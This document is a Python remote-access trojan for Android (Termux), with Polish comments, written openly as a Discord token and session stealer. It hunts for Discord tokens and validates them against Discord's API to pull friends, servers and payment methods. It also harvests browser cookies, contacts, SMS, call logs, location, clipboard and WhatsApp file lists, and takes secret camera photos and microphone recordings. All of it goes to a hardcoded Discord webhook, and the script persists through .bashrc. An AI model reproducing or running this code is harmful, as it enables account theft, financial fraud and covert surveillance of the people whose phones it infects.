#!/usr/bin/env python3
"""
Android 16 RAT - Discord Token + Session Stealer
Wysyła wszystko na webhook Discord
"""
import os
import sys
import json
import time
import subprocess
import requests
import re
import sqlite3
import shutil
import tempfile
from datetime import datetime

WEBHOOK = "https://discord.com/api/webhooks/1509286003586633929/J1B7qGfkiV7c1KRSZli3nB-Ua6ydFfR2d1GpShtTBEml2NaRT2UfBGKBbLaVXgwhqbHF"

def send(content, file_path=None):
    """Wyślij na webhook Discord"""
    try:
        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) < 10*1024*1024:
            with open(file_path, 'rb') as f:
                requests.post(WEBHOOK, data={"content": str(content)[:500]}, files={"file": (os.path.basename(file_path), f)}, timeout=15)
        else:
            for i in range(0, len(str(content)), 1900):
                requests.post(WEBHOOK, data={"content": str(content)[i:i+1900]}, timeout=15)
    except:
        pass

def cmd(c):
    return subprocess.getoutput(c)

def api(c):
    return subprocess.getoutput(f"timeout 15 {c} 2>/dev/null")

# ============================================================
# 1. INFO O URZĄDZENIU
# ============================================================
def device_info():
    model = cmd("getprop ro.product.model")
    man = cmd("getprop ro.product.manufacturer")
    rel = cmd("getprop ro.build.version.release")
    sdk = cmd("getprop ro.build.version.sdk")
    id_ = cmd("settings get secure android_id")
    ip = cmd("ip -4 addr show wlan0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1")
    send(f"""**=== NOWE URZĄDZENIE ===**
Model: {model} ({man})
Android: {rel} (SDK {sdk})
ID: {id_[:8]}
IP: {ip}
Czas: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}""")

# ============================================================
# 2. KRADZIEŻ TOKENA DISCORD
# ============================================================
def steal_discord():
    """Znajdź i wyślij token Discord"""
    send("[*] Szukam tokenów Discord...")
    
    # Wzory tokenów Discord
    patterns = [
        r'[MN][A-Za-z\d]{23,24}\.[A-Za-z\d]{6}\.[A-Za-z\d_-]{27,38}',
        r'mfa\.[A-Za-z0-9_-]{84}',
    ]
    
    # Lokalne pliki Discord (aplikacja)
    if cmd("pm list packages | grep -q com.discord"):
        send("[+] Discord APK zainstalowany")
        # Shared preferences
        prefs = cmd("find /data/data/com.discord -name '*.xml' 2>/dev/null")
        for p in prefs.split('\n'):
            p = p.strip()
            if p and os.path.exists(p):
                try:
                    with open(p, 'r') as f:
                        content = f.read()
                    for pattern in patterns:
                        found = re.findall(pattern, content)
                        for t in found:
                            send(f"**TOKEN DISCORD ZNALEZIONY!**\n```\n{t}\n```")
                            # Sprawdź token
                            check_token(t)
                except:
                    pass
    
    # Szukaj w całym storage
    send("[*] Skanuję całe urządzenie w poszukiwaniu tokenów...")
    found_tokens = set()
    
    try:
        # Pliki tekstowe, json, db, log, xml
        extensions = ['txt', 'json', 'db', 'log', 'xml', 'ldb', 'sqlite']
        for ext in extensions:
            files = cmd(f"find /storage/emulated/0 -name '*.{ext}' -type f 2>/dev/null | head -500")
            for f in files.split('\n'):
                f = f.strip()
                if not f or os.path.getsize(f) > 1024*1024:
                    continue
                try:
                    with open(f, 'rb') as fp:
                        content = fp.read(500000).decode('utf-8', errors='ignore')
                    for pattern in patterns:
                        matches = re.findall(pattern, content)
                        for t in matches:
                            if len(t) > 50 and t not in found_tokens:
                                found_tokens.add(t)
                                send(f"**TOKEN DISCORD!** (w: {f[-50:]})\n```\n{t}\n```")
                                check_token(t)
                except:
                    pass
    except:
        pass
    
    if not found_tokens:
        send("[-] Nie znaleziono tokenów Discord")

def check_token(token):
    """Sprawdź czy token jest ważny i pobierz dane użytkownika"""
    try:
        headers = {'Authorization': token}
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
        if r.status_code == 200:
            user = r.json()
            send(f"""**✅ TOKEN WAŻNY!**
**Użytkownik:** {user.get('username')}#{user.get('discriminator', '0')}
**ID:** {user.get('id')}
**Email:** {user.get('email', 'Brak')}
**Phone:** {user.get('phone', 'Brak')}
**MFA:** {user.get('mfa_enabled', False)}
**Nitro:** {user.get('premium_type', 0)}
**Avatar:** https://cdn.discordapp.com/avatars/{user.get('id')}/{user.get('avatar')}.png""")
            
            # Pobierz znajomych
            r2 = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers, timeout=10)
            if r2.status_code == 200:
                friends = r2.json()
                msg = f"**Znajomi ({len(friends)}):**\n```\n"
                for f in friends[:30]:
                    u = f.get('user', {})
                    msg += f"{u.get('username')}#{u.get('discriminator', '0')} - {u.get('id')}\n"
                msg += "```"
                send(msg)
            
            # Pobierz serwery
            r3 = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, timeout=10)
            if r3.status_code == 200:
                guilds = r3.json()
                msg = f"**Serwery ({len(guilds)}):**\n```\n"
                for g in guilds[:20]:
                    msg += f"{g.get('name')} (ID: {g.get('id')}) - {g.get('member_count', '?')} członków\n"
                msg += "```"
                send(msg)
            
            # Pobierz karty kredytowe (jeśli są)
            r4 = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers, timeout=10)
            if r4.status_code == 200:
                payments = r4.json()
                if payments:
                    msg = f"**Metody płatności ({len(payments)}):**\n```\n"
                    for p in payments:
                        msg += f"Typ: {p.get('type')}\nBrand: {p.get('brand')}\nLast 4: {p.get('last_4')}\nExp: {p.get('expires_month')}/{p.get('expires_year')}\n---\n"
                    msg += "```"
                    send(msg)
        else:
            send(f"[-] Token nieaktywny (status {r.status_code})")
    except:
        send("[-] Błąd sprawdzania tokena")

# ============================================================
# 3. CIasteczka i sesje przeglądarek
# ============================================================
def steal_browser_sessions():
    """Kradzież ciasteczek z przeglądarek (Discord, Facebook, Google, itp)"""
    send("[*] Szukam sesji Discord w przeglądarkach...")
    
    # Ścieżki do profili przeglądarek
    browser_paths = {
        "Chrome": "/data/data/com.android.chrome/app_chrome/Default",
        "Chrome_WebView": "/data/data/com.google.android.webview/app_webview/Default",
        "Samsung": "/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default",
        "Firefox": "/data/data/org.mozilla.firefox/files/mozilla",
        "Opera": "/data/data/com.opera.browser/app_opera/Default",
        "Edge": "/data/data/com.microsoft.emmx/app_emmx/Default",
        "Brave": "/data/data/com.brave.browser/app_brave/Default",
        "Kiwi": "/data/data/com.kiwibrowser.browser/app_chrome/Default",
    }
    
    # Jeśli nie ma roota, sprawdź czy content provider działa
    # Dla ciasteczek potrzebny jest dostęp do bazy Cookies
    
    # Próba przez content provider (Android 16)
    try:
        # Sprawdź czy content provider przeglądarki jest dostępny
        cookies = cmd("content query --uri content://com.android.chrome.CookiesProvider 2>/dev/null | head -20")
        if cookies:
            send(f"**Cookies Chrome (content):**\n```\n{cookies[:1500]}\n```")
    except:
        pass
    
    # Szukaj plików Cookies
    for browser, path in browser_paths.items():
        if cmd(f"ls {path} 2>/dev/null"):
            # Cookies DB
            cookie_file = f"{path}/Cookies"
            if os.path.exists(cookie_file):
                try:
                    # Kopiuj do tmp
                    tmp = tempfile.mktemp()
                    shutil.copy2(cookie_file, tmp)
                    conn = sqlite3.connect(tmp)
                    c = conn.cursor()
                    c.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key LIKE '%discord%' OR host_key LIKE '%google%' OR host_key LIKE '%facebook%'")
                    rows = c.fetchall()
                    conn.close()
                    os.remove(tmp)
                    
                    if rows:
                        msg = f"**{browser} - Cookies dla Discord/Google/Facebook:**\n```\n"
                        for host, name, value, enc in rows[:20]:
                            if value:
                                msg += f"{host}: {name}={value[:50]}\n"
                        msg += "```"
                        send(msg)
                except:
                    pass
            
            # Local Storage (może zawierać tokeny)
            ls_path = f"{path}/Local Storage/leveldb"
            if os.path.exists(ls_path):
                try:
                    for f in os.listdir(ls_path)[:50]:
                        fpath = os.path.join(ls_path, f)
                        if f.endswith('.ldb') or f.endswith('.log'):
                            with open(fpath, 'rb') as fp:
                                content = fp.read(50000).decode('utf-8', errors='ignore')
                            # Szukaj tokenów Discord
                            for pattern in [r'[MN][A-Za-z\d]{23,24}\.[A-Za-z\d]{6}\.[A-Za-z\d_-]{27,38}']:
                                matches = re.findall(pattern, content)
                                for t in matches:
                                    send(f"**TOKEN DISCORD z {browser} LocalStorage!**\n```\n{t}\n```")
                                    check_token(t)
                except:
                    pass

# ============================================================
# 4. Webhook Hijack - jeśli Discord otwarty
# ============================================================
def webhook_hijack():
    """Próba znalezienia webhooków w pamięci Discord"""
    send("[*] Szukam aktywnych webhooków Discord...")
    
    # Sprawdź czy Discord działa
    if "com.discord" in cmd("ps -ef 2>/dev/null | grep discord | head -5"):
        send("[+] Discord jest uruchomiony!")
        
        # Próba dumpowania pamięci (root)
        try:
            pid = cmd("ps -ef 2>/dev/null | grep com.discord | head -1 | awk '{print $2}'")
            if pid and cmd("id | grep -q uid=0"):
                mem_dump = cmd(f"su -c 'cat /proc/{pid}/maps 2>/dev/null' | head -50")
                if mem_dump:
                    send(f"**Memoria Discord:**\n```\n{mem_dump[:1500]}\n```")
        except:
            pass

# ============================================================
# 5. Keylogger (termux-keyboard - jeśli dostępne)
# ============================================================
def keylogger():
    """Uruchom keylogger w tle"""
    # Termux:API nie ma bezpośredniego keyloggera, ale można użyć
    # termux-keyboard do symulacji klawiatury
    pass

# ============================================================
# 6. Camera (Termux:API)
# ============================================================
def camera_photo():
    """Zrób zdjęcie przednim aparatem"""
    send("[*] Próbuję zrobić zdjęcie...")
    photo_path = f"/storage/emulated/0/DCIM/rat_{DEVICE_ID}_{int(time.time())}.jpg"
    result = api(f"termux-camera-photo -c 1 {photo_path}")
    if os.path.exists(photo_path) and os.path.getsize(photo_path) > 1000:
        send("**📸 Zdjęcie z przedniego aparatu:**", photo_path)
        os.remove(photo_path)
    else:
        # Tylny aparat
        photo_path = f"/storage/emulated/0/DCIM/rat_back_{int(time.time())}.jpg"
        result = api(f"termux-camera-photo -c 0 {photo_path}")
        if os.path.exists(photo_path) and os.path.getsize(photo_path) > 1000:
            send("**📸 Zdjęcie z tylnego aparatu:**", photo_path)
            os.remove(photo_path)
        else:
            send("[-] Kamera: brak dostępu")

# ============================================================
# 7. Microphone recording
# ============================================================
def mic_record():
    """Nagraj 10 sekund audio"""
    send("[*] Nagrywam audio (10s)...")
    audio_path = f"/storage/emulated/0/rat_audio_{int(time.time())}.mp3"
    result = api(f"termux-microphone-record -d 10 -f {audio_path}")
    if os.path.exists(audio_path) and os.path.getsize(audio_path) > 1000:
        send("**🎙️ Nagranie audio (10s):**", audio_path)
        os.remove(audio_path)
    else:
        send("[-] Mikrofon: brak dostępu")

# ============================================================
# 8. WhatsApp Session
# ============================================================
def whatsapp_stealer():
    """Kradzież sesji WhatsApp"""
    send("[*] Szukam danych WhatsApp...")
    
    # Pliki konfiguracyjne WhatsApp
    wa_paths = [
        "/data/data/com.whatsapp/shared_prefs",
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases",
    ]
    
    for path in wa_paths:
        if os.path.exists(path):
            try:
                files = os.listdir(path)
                if files:
                    send(f"**WhatsApp files in {path}:**\n```\n" + "\n".join(files[:20]) + "\n```")
            except:
                pass
    
    # Sprawdź czy WhatsApp jest otwarty
    if "com.whatsapp" in cmd("ps -ef 2>/dev/null | grep whatsapp | head -5"):
        send("[+] WhatsApp uruchomiony - można spróbować dumpować pamięć")

# ============================================================
# 9. Contacts, SMS, Calls (standard)
# ============================================================
def get_contacts():
    data = api("termux-contact-list")
    if data and data != '':
        try:
            c = json.loads(data)
            if c:
                msg = f"**Kontakty ({len(c)}):**\n```\n"
                for x in c[:100]:
                    name = x.get('name', '?')
                    nums = ', '.join(x.get('numbers', ['?']))
                    msg += f"{name}: {nums}\n"
                msg += "```"
                send(msg)
        except:
            pass

def get_sms():
    raw = cmd("content query --uri content://sms/inbox --projection address:body:date_sent 2>/dev/null | tail -20")
    if raw.strip():
        send(f"**SMS Odebrane:**\n```\n{raw[:1500]}\n```")

def get_calls():
    raw = cmd("content query --uri content://call_log/calls --projection number:date:duration:type 2>/dev/null | tail -20")
    if raw.strip():
        send(f"**Logi połączeń:**\n```\n{raw[:1500]}\n```")

def get_location():
    data = api("termux-location -p provider 2>/dev/null")
    if data and data != '{}':
        try:
            loc = json.loads(data)
            lat = loc.get('latitude', '?')
            lon = loc.get('longitude', '?')
            send(f"""**Lokalizacja:**
Lat: {lat}
Lon: {lon}
https://maps.google.com/maps?q={lat},{lon}""")
        except:
            pass

def get_clipboard():
    data = api("termux-clipboard-get 2>/dev/null")
    if data and len(data) > 3:
        send(f"**Schowek:**\n```\n{data[:500]}\n```")

# ============================================================
# PERSISTENCE
# ============================================================
def persist():
    script = os.path.abspath(__file__)
    bashrc = os.path.expanduser("~/.bashrc")
    line = f"python3 {script} --daemon &\n"
    try:
        with open(bashrc, 'r') as f:
            if line not in f.read():
                with open(bashrc, 'a') as f:
                    f.write(f"\n# RAT\n{line}")
    except:
        pass

# ============================================================
# MAIN
# ============================================================
DEVICE_ID = cmd("settings get secure android_id")[:8]

def main():
    daemon = '--daemon' in sys.argv
    
    send("[*] RAT uruchomiony na Android 16")
    device_info()
    
    # Discord token + session
    steal_discord()
    steal_browser_sessions()
    webhook_hijack()
    
    # Standardowe dane
    get_contacts()
    get_sms()
    get_calls()
    get_location()
    get_clipboard()
    whatsapp_stealer()
    
    # Multimedia (opcjonalnie)
    try:
        camera_photo()
    except:
        pass
    try:
        mic_record()
    except:
        pass
    
    send("[+] Zakończono pierwszą kolekcję")
    persist()
    
    if daemon:
        send("[*] Tryb demona - pracuję co 5 minut")
        while True:
            time.sleep(300)
            steal_discord()  # Sprawdź czy pojawił się nowy token
            get_location()
            get_clipboard()
            try:
                camera_photo()
            except:
                pass

if __name__ == "__main__":
    main()
